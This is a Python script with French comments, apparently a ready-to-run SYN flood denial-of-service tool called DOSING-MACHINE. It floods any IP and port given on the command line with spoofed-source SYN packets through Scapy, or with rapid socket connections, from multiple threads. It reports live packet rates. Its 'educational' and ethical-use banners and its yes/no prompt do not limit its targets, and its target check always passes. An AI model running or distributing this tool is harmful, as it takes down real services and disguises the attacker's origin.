#!/usr/bin/env python3
"""
DOSING-MACHINE - Simulateur SYN Flood Éducatif
Usage éthique uniquement - Pour comprendre les vulnérabilités TCP/IP
Auteur: Oussama Bouguerra
"""

import socket
import random
import threading
import time
import sys
import argparse
from scapy.all import *

class DOSINGMachine:
    def __init__(self, target_ip, target_port, num_threads=10):
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_threads = num_threads
        self.attack_active = False
        self.packets_sent = 0
        self.start_time = None
        
    def generate_random_ip(self):
        """Génère une IP source aléatoire pour l'usurpation"""
        return ".".join(str(random.randint(1, 254)) for _ in range(4))
    
    def syn_flood_scapy(self, thread_id):
        """Attaque SYN flood utilisant Scapy pour un contrôle précis"""
        print(f"[Thread {thread_id}] Démarrage de l'attaque SYN flood...")
        
        while self.attack_active:
            try:
                # Génération d'une IP source aléatoire
                source_ip = self.generate_random_ip()
                source_port = random.randint(1024, 65535)
                
                # Création du paquet SYN
                ip_layer = IP(src=source_ip, dst=self.target_ip)
                tcp_layer = TCP(
                    sport=source_port, 
                    dport=self.target_port, 
                    flags="S",  # SYN flag
                    seq=random.randint(1000, 9000)
                )
                
                packet = ip_layer / tcp_layer
                
                # Envoi du paquet
                send(packet, verbose=0)
                self.packets_sent += 1
                
                # Petit délai pour éviter de saturer complètement
                time.sleep(0.001)
                
            except Exception as e:
                print(f"[Thread {thread_id}] Erreur: {e}")
                continue
    
    def syn_flood_socket(self, thread_id):
        """Attaque SYN flood utilisant les sockets raw (alternative)"""
        print(f"[Thread {thread_id}] Démarrage de l'attaque socket...")
        
        while self.attack_active:
            try:
                # Création d'un socket TCP
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                
                # Tentative de connexion (qui sera abandonnée)
                try:
                    sock.connect((self.target_ip, self.target_port))
                except:
                    pass  # On ignore les erreurs de connexion
                finally:
                    sock.close()
                
                self.packets_sent += 1
                time.sleep(0.01)
                
            except Exception as e:
                continue
    
    def display_stats(self):
        """Affiche les statistiques en temps réel"""
        while self.attack_active:
            if self.start_time:
                elapsed = time.time() - self.start_time
                rate = self.packets_sent / elapsed if elapsed > 0 else 0
                
                sys.stdout.write(f"\r[DOSING] Paquets envoyés: {self.packets_sent} | "
                               f"Taux: {rate:.2f} pkt/s | Durée: {elapsed:.1f}s")
                sys.stdout.flush()
            
            time.sleep(1)
    
    def start_attack(self, method="scapy"):
        """Démarre l'attaque avec la méthode choisie"""
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║                    DOSING-MACHINE v1.0                      ║
║              Simulateur SYN Flood Éducatif                  ║
╠══════════════════════════════════════════════════════════════╣
║ AVERTISSEMENT: Usage éthique uniquement!                    ║
║ - Tests sur vos propres systèmes uniquement                 ║
║ - Environnements de lab/simulation                          ║
║ - Compréhension des vulnérabilités TCP/IP                   ║
╚══════════════════════════════════════════════════════════════╝
        """)
        
        print(f"\n[INFO] Cible: {self.target_ip}:{self.target_port}")
        print(f"[INFO] Méthode: {method}")
        print(f"[INFO] Threads: {self.num_threads}")
        
        # Vérification de la cible
        if not self.check_target():
            print("[ERREUR] Cible non accessible. Vérifiez l'IP/port.")
            return
        
        self.attack_active = True
        self.start_time = time.time()
        
        # Démarrage du thread de statistiques
        stats_thread = threading.Thread(target=self.display_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        # Démarrage des threads d'attaque
        threads = []
        for i in range(self.num_threads):
            if method == "scapy":
                t = threading.Thread(target=self.syn_flood_scapy, args=(i,))
            else:
                t = threading.Thread(target=self.syn_flood_socket, args=(i,))
            
            t.daemon = True
            t.start()
            threads.append(t)
        
        try:
            print(f"\n[ATTAQUE] Démarrée! Appuyez sur Ctrl+C pour arrêter...")
            while True:
                time.sleep(1)
                
        except KeyboardInterrupt:
            print(f"\n\n[ARRÊT] Arrêt de l'attaque demandé...")
            self.stop_attack()
    
    def stop_attack(self):
        """Arrête l'attaque et affiche le rapport final"""
        self.attack_active = False
        time.sleep(2)  # Attendre que les threads se terminent
        
        total_time = time.time() - self.start_time if self.start_time else 0
        avg_rate = self.packets_sent / total_time if total_time > 0 else 0
        
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║                    RAPPORT D'ATTAQUE                        ║
╠══════════════════════════════════════════════════════════════╣
║ Paquets envoyés: {self.packets_sent:<10} Durée: {total_time:.1f}s        ║
║ Taux moyen: {avg_rate:.2f} pkt/s                                   ║
║ Cible: {self.target_ip}:{self.target_port}                         ║
╚══════════════════════════════════════════════════════════════╝
        """)
    
    def check_target(self):
        """Vérifie si la cible est accessible"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((self.target_ip, self.target_port))
            sock.close()
            return True  # Retourne True même si la connexion échoue (port fermé)
        except:
            return False

def main():
    parser = argparse.ArgumentParser(
        description="DOSING-MACHINE - Simulateur SYN Flood Éducatif",
        epilog="ATTENTION: Usage éthique uniquement! Tests sur vos systèmes uniquement."
    )
    
    parser.add_argument("target", help="IP cible")
    parser.add_argument("port", type=int, help="Port cible")
    parser.add_argument("-t", "--threads", type=int, default=10, 
                       help="Nombre de threads (défaut: 10)")
    parser.add_argument("-m", "--method", choices=["scapy", "socket"], 
                       default="scapy", help="Méthode d'attaque (défaut: scapy)")
    
    args = parser.parse_args()
    
    # Validation de l'IP
    try:
        socket.inet_aton(args.target)
    except socket.error:
        print("[ERREUR] Format d'IP invalide!")
        sys.exit(1)
    
    # Validation du port
    if not (1 <= args.port <= 65535):
        print("[ERREUR] Port doit être entre 1 et 65535!")
        sys.exit(1)
    
    # Vérification des privilèges pour Scapy
    if args.method == "scapy" and os.geteuid() != 0:
        print("[AVERTISSEMENT] Privilèges root requis pour Scapy. Utilisation de la méthode socket.")
        args.method = "socket"
    
    # Avertissement éthique
    print("\n" + "="*60)
    print("⚠️  AVERTISSEMENT IMPORTANT ⚠️")
    print("="*60)
    print("Cet outil est destiné UNIQUEMENT à des fins éducatives!")
    print("- Tests sur VOS propres systèmes uniquement")
    print("- Environnements de laboratoire/simulation")
    print("- Compréhension des vulnérabilités réseau")
    print("\nL'utilisation malveillante est strictement interdite!")
    print("="*60)
    
    response = input("\nConfirmez-vous l'usage éthique? (oui/non): ").lower()
    if response not in ['oui', 'o', 'yes', 'y']:
        print("Arrêt du programme.")
        sys.exit(0)
    
    # Création et lancement de l'attaque
    dosing = DOSINGMachine(args.target, args.port, args.threads)
    dosing.start_attack(args.method)

if __name__ == "__main__":
    import os
    main()
